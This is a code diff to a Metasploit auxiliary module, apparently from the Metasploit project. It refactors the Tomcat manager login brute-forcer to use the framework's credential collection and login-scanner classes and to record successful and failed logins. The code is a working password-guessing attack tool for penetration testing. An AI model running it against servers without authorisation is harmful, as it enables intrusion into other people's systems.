@@ -4,6 +4,8 @@
 ##
 
 require 'msf/core'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/tomcat'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -91,60 +93,68 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    each_user_pass { |user, pass|
-      do_login(user, pass)
+    cred_collection = Metasploit::Framework::CredentialCollection.new(
+        blank_passwords: datastore['BLANK_PASSWORDS'],
+        pass_file: datastore['PASS_FILE'],
+        password: datastore['PASSWORD'],
+        user_file: datastore['USER_FILE'],
+        userpass_file: datastore['USERPASS_FILE'],
+        username: datastore['USERNAME'],
+        user_as_pass: datastore['USER_AS_PASS'],
+    )
+
+    scanner = Metasploit::Framework::LoginScanner::Tomcat.new(
+        host: ip,
+        port: rport,
+        proxies: datastore['PROXIES'],
+        cred_details: cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        connection_timeout: 10
+    )
+
+    service_data = {
+        address: ip,
+        port: rport,
+        service_name: (ssl ? 'https' : 'http'),
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
     }
-  end
 
-  def do_login(user='tomcat', pass='tomcat')
-    vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' with password:'#{pass}'")
-    success = false
-    srvhdr = '?'
-    uri = normalize_uri(datastore['URI'])
-    begin
-      res = send_request_cgi({
-        'uri'     => uri,
-        'method'  => 'GET',
-        'username' => user,
-        'password' => pass
-        }, 25)
-      unless (res.kind_of? Rex::Proto::Http::Response)
-        vprint_error("http://#{rhost}:#{rport}#{uri} not responding")
-        return :abort
+    scanner.scan! do |result|
+      if result.success?
+        credential_data = {
+            module_fullname: self.fullname,
+            origin_type: :service,
+            private_data: result.credential.private,
+            private_type: :password,
+            username: result.credential.public
+        }
+        credential_data.merge!(service_data)
+
+        credential_core = create_credential(credential_data)
+
+        login_data = {
+            core: credential_core,
+            last_attempted_at: DateTime.now,
+            status: Metasploit::Model::Login::Status::SUCCESSFUL
+        }
+        login_data.merge!(service_data)
+
+        create_credential_login(login_data)
+        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
+      else
+        invalidate_login(
+            address: ip,
+            port: rport,
+            protocol: 'tcp',
+            public: result.credential.public,
+            private: result.credential.private,
+            realm_key: nil,
+            realm_value: nil,
+            status: result.status)
+        print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
       end
-      return :abort if (res.code == 404)
-      srvhdr = res.headers['Server']
-      if res.code == 200
-        # Could go with res.headers['Server'] =~ /Apache-Coyote/i
-        # as well but that seems like an element someone's more
-        # likely to change
-        success = true if(res.body.scan(/Tomcat/i).size >= 5)
-        success
-      end
-
-    rescue ::Rex::ConnectionError => e
-      vprint_error("http://#{rhost}:#{rport}#{uri} - #{e}")
-      return :abort
-    end
-
-    if success
-      print_good("http://#{rhost}:#{rport}#{uri} [#{srvhdr}] [Tomcat Application Manager] successful login '#{user}' : '#{pass}'")
-      report_auth_info(
-        :host => rhost,
-        :port => rport,
-        :sname => (ssl ? 'https' : 'http'),
-        :user => user,
-        :pass => pass,
-        :proof => "WEBAPP=\"Tomcat Application Manager\"",
-        :source_type => "user_supplied",
-        :duplicate_ok => true,
-        :active => true
-      )
-
-      return :next_user
-    else
-      vprint_error("http://#{rhost}:#{rport}#{uri} [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'")
-      return
     end
   end
+
 end
